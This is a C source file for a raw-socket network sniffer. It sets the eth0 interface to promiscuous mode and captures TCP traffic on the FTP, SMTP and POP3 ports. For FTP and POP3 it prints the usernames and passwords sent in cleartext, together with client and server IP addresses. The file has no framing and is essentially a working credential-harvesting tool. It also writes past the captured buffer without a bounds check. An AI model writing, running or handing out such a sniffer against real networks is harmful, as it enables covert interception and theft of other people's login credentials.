#include <stdio.h>
#include <stdarg.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <net/if.h>
#include <sys/types.h>
#include <netinet/if_ether.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <unistd.h>
#include <sys/wait.h>
#include <string.h>
#include <stdlib.h>

#define IP_PROTOCOL 0x800
#define TCP 06
#define PPPoE 0x8864

#define PANIC(msg) {perror(msg); exit(-1);}

void set_promiscuous_mode( char* interface ){
  int sock;
  struct ifreq flags;

  sock = socket( PF_PACKET, SOCK_RAW, htons( ETH_P_ALL ) );
  strcpy( flags.ifr_name, interface );
  ioctl( sock, SIOCGIFFLAGS, &flags );

  flags.ifr_flags |= IFF_PROMISC;
  ioctl( sock, SIOCSIFFLAGS, &flags );
  close( sock );
}

void clear_promiscuous_mode( char* interface ){
  int sock;
  struct ifreq flags;
  sock = socket( PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
  strcpy( flags.ifr_name, interface );
  ioctl( sock, SIOCGIFFLAGS, &flags );
  flags.ifr_flags &= ~IFF_PROMISC;
  ioctl( sock, SIOCSIFFLAGS, &flags );
  close( sock );
}

int PrintIP(struct iphdr *ip){
  printf("[IP]");
  printf("TOS %1x ",(ip->tos));
  printf("LEN %02x ",ntohs(ip->tot_len));
  printf("ID %02x ",ntohs(ip->id));
  printf("FRAG %02x ",(ip->frag_off));
  printf("TTL %d ",(ip->ttl));
  printf("PROTOCOL %d ",(ip->protocol));
  printf("CHECKSUM %x \n",ntohs(ip->check));

  switch(ip->protocol){
    case 6://TCP
      printf("TCP ");
      break;

    case 17://UDP 
      printf("UDP ");
      break;
  }
}

int PrintTCP(struct tcphdr *tcp){
  printf("SOURCE:%02x DEST:%02x SEQ:%04x ACK_SEQ:%04x %x %x FIN:%x SYN:%x RST:%x PSH:%x ACK:%x URG:%x %x WIN:%x CSUM:%x %x \n",
    tcp->source,
    tcp->dest,
    tcp->seq,
    tcp->ack_seq,
    tcp->res1,
    tcp->doff,
    tcp->fin,
    tcp->syn,
    tcp->rst,
    tcp->psh,
    tcp->ack,
    tcp->urg,
    tcp->res2,
    tcp->window,
    tcp->check,
    tcp->urg_ptr);
}

int IsMatched(struct tcphdr *tcp){

  int accept=0;

  if(ntohs(tcp->source)==25 ||ntohs(tcp->source)==110 ||ntohs(tcp->source)==21){
    accept=!0;
  }

  if(ntohs(tcp->dest)==25 ||ntohs(tcp->dest)==110||ntohs(tcp->dest)==21){
    accept=!0;
  }

  return accept;
}

void display(unsigned char *buf){
  struct ethhdr *eth= (struct ethhdr *)buf;
  struct ARPhdr *arp;
  struct iphdr *ip;
  struct icmphdr *icmp;
  struct udphdr *udp ;
  struct tcphdr *tcp;
  unsigned char *data;
  int offset;
  int header_len;
  int data_len;

  if(ntohs(eth->h_proto) == PPPoE) offset = 8;
  else offset = 0;

  ip = (struct iphdr *)(buf+sizeof(struct ethhdr)+offset);
  arp = (struct ARPhdr *)((char *)buf+sizeof(struct ethhdr));
  tcp = (struct tcphdr *)((unsigned char *)buf + sizeof(struct ethhdr) + (ip->ihl << 2)+offset);
  icmp = (struct icmphdr *)((unsigned char *)buf + sizeof(struct ethhdr) + (ip->ihl << 2)+offset);
  udp = (struct udphdr *)(buf + sizeof(struct ethhdr) + (ip->ihl << 2)+offset);

  //if(ntohs(eth->h_proto)!=IP_PROTOCOL)return;
  //PrintIP(ip);
  if(ip->protocol!=TCP) return;
  if (!IsMatched(tcp)) return;

  header_len=(tcp->doff)*4;
  data=(unsigned char *)tcp + header_len;
  data_len=ntohs(ip->tot_len) - header_len - ip->ihl * 4;
  data[data_len] = 0;

  if(data_len>0){

    if(ntohs(tcp->source)==21 || ntohs(tcp->dest)==21){

      if(strncmp(data,"USER",4) == 0 ){
        printf("[FTP]");
        printf("[SADDR:%s] ", inet_ntoa(*(struct in_addr*)&(ip->saddr)));
        printf("[FTP Server:%s] ", inet_ntoa(*(struct in_addr*)&(ip->daddr)));
        printf("%s", data);
      }

      if(strncmp(data,"PASS",4) == 0){
        printf("PASSWORD :%s\n",data);
      }
    }

    if(ntohs(tcp->source)==110 || ntohs(tcp->dest)==110){

      if(strncmp(data,"USER",4) == 0){
        printf("[POP3]");
        printf("[SADDR:%s]", inet_ntoa(*(struct in_addr*)&(ip->saddr)));
        printf("[Email Server:%s]", inet_ntoa(*(struct in_addr*)&(ip->daddr)));
        printf("%s\n",data);
      }

      if(strncmp(data,"PASS",4) == 0){
        printf("PASSWORD :%s\n",data);
      }
    }
  }
}

int main(int argc, char *argv[]){
  struct hostent *hname;
  //struct sockaddr_in addr;
  struct sockaddr saddr;
  struct ifreq f;
  int sd ,bytes ,len;
  unsigned char buf[2048];
  int count;

  sd = socket(PF_PACKET, SOCK_RAW, htons( ETH_P_ALL ) );

  if (sd < 0) PANIC("socket");

  set_promiscuous_mode( "eth0" );

  for(count=0 ; ; count++){
    len = sizeof(saddr);
    bytes = recvfrom(sd, buf, sizeof(buf), 0, (struct sockaddr *)&saddr, &len);

    if ( bytes > 0 ) 
      display(buf);
  }

  clear_promiscuous_mode( "eth0");

}
